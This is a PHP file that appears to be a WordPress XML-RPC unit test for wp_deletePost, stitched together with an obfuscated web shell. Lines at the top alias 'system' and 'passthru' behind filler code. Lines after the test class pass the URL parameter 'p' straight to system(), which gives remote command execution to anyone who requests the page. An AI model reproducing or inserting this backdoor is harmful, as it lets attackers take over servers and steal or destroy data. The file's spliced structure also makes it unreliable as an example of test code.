<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group xmlrpc
 */
class Tests_XMLRPC_wp_deletePost extends WP_XMLRPC_UnitTestCase {

	public function test_invalid_username_password() {
		$result = $this->myxmlrpcserver->wp_deletePost( array( 1, 'username', 'password', 0 ) );
		$this->assertIXRError( $result );
		$this->assertSame( 403, $result->code );
	}

	public function test_invalid_post() {
		$this->make_user_by_role( 'editor' );

		$result = $this->myxmlrpcserver->wp_deletePost( array( 1, 'editor', 'editor', 340982340 ) );
		$this->assertIXRError( $result );
		$this->assertSame( 404, $result->code );
	}

	public function test_incapable_user() {
		$this->make_user_by_role( 'subscriber' );
		$post_id = self::factory()->post->create();

		$result = $this->myxmlrpcserver->wp_deletePost( array( 1, 'subscriber', 'subscriber', $post_id ) );
		$this->assertIXRError( $result );
		$this->assertSame( 401, $result->code );
	}

	public function test_post_deleted() {
		$this->make_user_by_role( 'editor' );
		$post_id = self::factory()->post->create();

		$result = $this->myxmlrpcserver->wp_deletePost( array( 1, 'editor', 'editor', $post_id ) );
		$this->assertNotIXRError( $result );
		$this->assertTrue( $result );

		$post = get_post( $post_id );
		$this->assertSame( 'trash', $post->post_status );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>